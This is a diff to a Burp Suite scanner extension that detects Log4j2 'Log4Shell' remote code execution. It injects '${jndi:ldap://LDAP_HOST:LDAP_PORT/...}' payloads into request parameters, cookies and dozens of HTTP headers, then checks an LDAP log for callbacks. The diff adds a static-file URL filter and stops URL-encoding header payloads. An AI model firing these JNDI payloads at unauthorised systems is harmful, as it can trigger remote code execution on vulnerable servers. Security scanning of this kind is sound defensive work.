@@ -36,58 +36,73 @@ class BurpExtender(IBurpExtender, IScannerCheck):
     def _build_payload(self, random_md5):
         return urllib.quote("${jndi:ldap://LDAP_HOST:LDAP_PORT/" + random_md5 + "}")
 
+    def _url_filter(self, url):
+        try:
+            url_index = url.index("?")
+            url = url.substring(0, url_index)
+        except:
+            url = url
+        result = re.findall("[\\w]+[\\.](3g2|3gp|7z|aac|abw|aif|aifc|aiff|arc|au|avi|azw|bin|bmp|bz|bz2|cmx|cod|csh|css|csv|doc|docx|eot|epub|gif|gz|ico|ics|ief|jar|jfif|jpe|jpeg|jpg|m3u|mid|midi|mjs|mp2|mp3|mpa|mpe|mpeg|mpg|mpkg|mpp|mpv2|odp|ods|odt|oga|ogv|ogx|otf|pbm|pdf|pgm|png|pnm|ppm|ppt|pptx|ra|ram|rar|ras|rgb|rmi|rtf|snd|svg|swf|tar|tif|tiff|ttf|vsd|wav|weba|webm|webp|woff|woff2|xbm|xls|xlsx|xpm|xul|xwd|zip|zip)", url)
+        if result != []:
+            return False
+        else:
+            return True
+
     def _build_request_list(self, baseRequestResponse):
         request_list = {}
         request_info = self._helpers.analyzeRequest(baseRequestResponse)
         # Check Parameters
         param_list = request_info.getParameters()
-        if param_list != []:
-            request_message = baseRequestResponse.getRequest()
-            for p in param_list:
-                key = p.getName()
-                value = p.getValue()
-                ptype = p.getType()
-                random_md5 = self._get_hash_str()
-                payload = self._build_payload(random_md5)
-                if (ptype == IParameter.PARAM_URL) or (ptype == IParameter.PARAM_BODY) or (ptype == IParameter.PARAM_COOKIE):
-                    request_message = self._helpers.updateParameter(request_message, self._helpers.buildParameter(key, payload, ptype))
+        url = request_info.getUrl().toString()
+        if self._url_filter(url):
+            if param_list != []:
+                request_message = baseRequestResponse.getRequest()
+                for p in param_list:
+                    key = p.getName()
+                    value = p.getValue()
+                    ptype = p.getType()
+                    random_md5 = self._get_hash_str()
+                    payload = self._build_payload(random_md5)
+                    if (ptype == IParameter.PARAM_URL) or (ptype == IParameter.PARAM_BODY) or (ptype == IParameter.PARAM_COOKIE):
+                        request_message = self._helpers.updateParameter(request_message, self._helpers.buildParameter(key, payload, ptype))
+                        request_list[random_md5] = {payload: request_message}
+                        request_message = self._helpers.updateParameter(request_message, self._helpers.buildParameter(key, value, ptype))
+                    else:
+                        value_start = p.getValueStart()
+                        request_message_copy = request_message
+                        request_message_str = self._helpers.bytesToString(request_message_copy)
+                        request_message_list = list(request_message_str)
+                        for i in range(len(value)):
+                            request_message_list.pop(value_start)
+                        for i in range(0,len(payload)):
+                            request_message_list.insert(value_start+i, payload[i])
+                        request_list[random_md5] = {payload: self._helpers.stringToBytes(''.join(request_message_list))}
+
+            header_list = request_info.getHeaders()
+            other_header_list = ["Accept-Charset", "Accept-Datetime", "Accept-Encoding", "Accept-Language", "Cache-Control", "Client-IP", "Connection", "Contact", "Cookie", "DNT", "Forwarded", "Forwarded-For", "Forwarded-For-Ip", "Forwarded-Proto", "From", "Host", "Max-Forwards", "Origin", "Pragma", "Referer", "TE", "True-Client-IP", "Upgrade", "User-Agent", "Via", "Warning", "X-Api-Version", "X-ATT-DeviceId", "X-Client-IP", "X-Correlation-ID", "X-Csrf-Token", "X-CSRFToken", "X-Custom-IP-Authorization", "X-Do-Not-Track", "X-Foo", "X-Foo-Bar", "X-Forward", "X-Forward-For", "X-Forward-Proto", "X-Forwarded", "X-Forwarded-By", "X-Forwarded-For", "X-Forwarded-For-Original", "X-Forwarded-Host", "X-Forwarded-Port", "X-Forwarded-Proto", "X-Forwarded-Protocol", "X-Forwarded-Scheme", "X-Forwarded-Server", "X-Forwarded-Ssl", "X-Forwarder-For", "X-Forwared-Host", "X-Frame-Options", "X-From", "X-Geoip-Country", "X-Host", "X-Http-Destinationurl", "X-Http-Host-Override", "X-Http-Method", "X-HTTP-Method-Override", "X-Http-Path-Override", "X-Https", "X-Htx-Agent", "X-Hub-Signature", "X-If-Unmodified-Since", "X-Imbo-Test-Config", "X-Insight", "X-Ip", "X-Ip-Trail", "X-Original-URL", "X-Originating-IP", "X-Override-URL", "X-ProxyUser-Ip", "X-Real-IP", "X-Remote-Addr", "X-Remote-IP", "X-Request-ID", "X-Requested-With", "X-Rewrite-URL", "X-UIDH", "X-Wap-Profile", "X-XSRF-TOKEN", "If-Modified-Since"]
+            if header_list != []:
+                for i in range(1, len(header_list)):
+                    header_list = request_info.getHeaders()
+                    random_md5 = self._get_hash_str()
+                    # Header: Don't URLEncode
+                    payload = self._helpers.urlDecode(self._build_payload(random_md5))
+                    tmp_header = header_list[i]
+                    tmp_header_split = tmp_header.split(": ")
+                    tmp_header_split[1] = payload
+                    header_name = tmp_header_split[0]
+                    if header_name in other_header_list:
+                        other_header_list.remove(header_name)
+                    header_list[i] = ": ".join(tmp_header_split)
+                    request_message = self._helpers.buildHttpMessage(header_list, baseRequestResponse.getRequest()[request_info.getBodyOffset():])
                     request_list[random_md5] = {payload: request_message}
-                    request_message = self._helpers.updateParameter(request_message, self._helpers.buildParameter(key, value, ptype))
-                else:
-                    value_start = p.getValueStart()
-                    request_message_copy = request_message
-                    request_message_str = self._helpers.bytesToString(request_message_copy)
-                    request_message_list = list(request_message_str)
-                    for i in range(len(value)):
-                        request_message_list.pop(value_start)
-                    for i in range(0,len(payload)):
-                        request_message_list.insert(value_start+i, payload[i])
-                    request_list[random_md5] = {payload: self._helpers.stringToBytes(''.join(request_message_list))}
 
-        header_list = request_info.getHeaders()
-        other_header_list = ["Accept-Charset", "Accept-Datetime", "Accept-Encoding", "Accept-Language", "Cache-Control", "Client-IP", "Connection", "Contact", "Cookie", "DNT", "Forwarded", "Forwarded-For", "Forwarded-For-Ip", "Forwarded-Proto", "From", "Host", "Max-Forwards", "Origin", "Pragma", "Referer", "TE", "True-Client-IP", "Upgrade", "User-Agent", "Via", "Warning", "X-Api-Version", "X-ATT-DeviceId", "X-Client-IP", "X-Correlation-ID", "X-Csrf-Token", "X-CSRFToken", "X-Custom-IP-Authorization", "X-Do-Not-Track", "X-Foo", "X-Foo-Bar", "X-Forward", "X-Forward-For", "X-Forward-Proto", "X-Forwarded", "X-Forwarded-By", "X-Forwarded-For", "X-Forwarded-For-Original", "X-Forwarded-Host", "X-Forwarded-Port", "X-Forwarded-Proto", "X-Forwarded-Protocol", "X-Forwarded-Scheme", "X-Forwarded-Server", "X-Forwarded-Ssl", "X-Forwarder-For", "X-Forwared-Host", "X-Frame-Options", "X-From", "X-Geoip-Country", "X-Host", "X-Http-Destinationurl", "X-Http-Host-Override", "X-Http-Method", "X-HTTP-Method-Override", "X-Http-Path-Override", "X-Https", "X-Htx-Agent", "X-Hub-Signature", "X-If-Unmodified-Since", "X-Imbo-Test-Config", "X-Insight", "X-Ip", "X-Ip-Trail", "X-Original-URL", "X-Originating-IP", "X-Override-URL", "X-ProxyUser-Ip", "X-Real-IP", "X-Remote-Addr", "X-Remote-IP", "X-Request-ID", "X-Requested-With", "X-Rewrite-URL", "X-UIDH", "X-Wap-Profile", "X-XSRF-TOKEN", "If-Modified-Since"]
-        if header_list != []:
-            for i in range(1, len(header_list)):
-                header_list = request_info.getHeaders()
-                random_md5 = self._get_hash_str()
-                payload = self._build_payload(random_md5)
-                tmp_header = header_list[i]
-                tmp_header_split = tmp_header.split(": ")
-                tmp_header_split[1] = payload
-                header_name = tmp_header_split[0]
-                if header_name in other_header_list:
-                    other_header_list.remove(header_name)
-                header_list[i] = ": ".join(tmp_header_split)
-                request_message = self._helpers.buildHttpMessage(header_list, baseRequestResponse.getRequest()[request_info.getBodyOffset():])
-                request_list[random_md5] = {payload: request_message}
-
-            for i in other_header_list:
-                header_list = request_info.getHeaders()
-                random_md5 = self._get_hash_str()
-                payload = self._build_payload(random_md5)
-                header_list.add("{0}: {1}".format(i, payload))
-                request_message = self._helpers.buildHttpMessage(header_list, baseRequestResponse.getRequest()[request_info.getBodyOffset():])
-                request_list[random_md5] = {payload: request_message}
+                for i in other_header_list:
+                    header_list = request_info.getHeaders()
+                    random_md5 = self._get_hash_str()
+                    payload = self._helpers.urlDecode(self._build_payload(random_md5))
+                    header_list.add("{0}: {1}".format(i, payload))
+                    request_message = self._helpers.buildHttpMessage(header_list, baseRequestResponse.getRequest()[request_info.getBodyOffset():])
+                    request_list[random_md5] = {payload: request_message}
         return request_list
 
     def _get_matches(self, req, match):
@@ -105,22 +120,23 @@ class BurpExtender(IBurpExtender, IScannerCheck):
 
     def doPassiveScan(self, baseRequestResponse):
         request_list = self._build_request_list(baseRequestResponse)
-        for r in request_list.keys():
-            payload = request_list[r].keys()[0]
-            request_message = request_list[r][payload]
-            checkRequestResponse = self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), request_message)
-            json_text = self._get_ldap_log(r)
-            request_matches = self._get_matches(checkRequestResponse.getRequest(), bytearray(payload.encode("utf-8")))
-            if json_text:
-                return [CustomScanIssue(
-                    baseRequestResponse.getHttpService(),
-                    self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
-                    [self._callbacks.applyMarkers(checkRequestResponse, request_matches, [])],
-                    "Log4j2 Remote Code Execution",
-                    "Payload: {0}<br>Author: key @ Yuanheng Lab".format(r),
-                    "High")]
-        
-                
+        if request_list != []:
+            for r in request_list.keys():
+                payload = request_list[r].keys()[0]
+                request_message = request_list[r][payload]
+                checkRequestResponse = self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), request_message)
+                json_text = self._get_ldap_log(r)
+                request_matches = self._get_matches(checkRequestResponse.getRequest(), bytearray(payload.encode("utf-8")))
+                if json_text:
+                    return [CustomScanIssue(
+                        baseRequestResponse.getHttpService(),
+                        self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
+                        [self._callbacks.applyMarkers(checkRequestResponse, request_matches, [])],
+                        "Log4j2 Remote Code Execution",
+                        "Payload: {0}<br>Author: key @ Yuanheng Lab".format(r),
+                        "High")]
+            
+                    
     def doActiveScan(self, baseRequestResponse, insertionPoint):
         pass
 
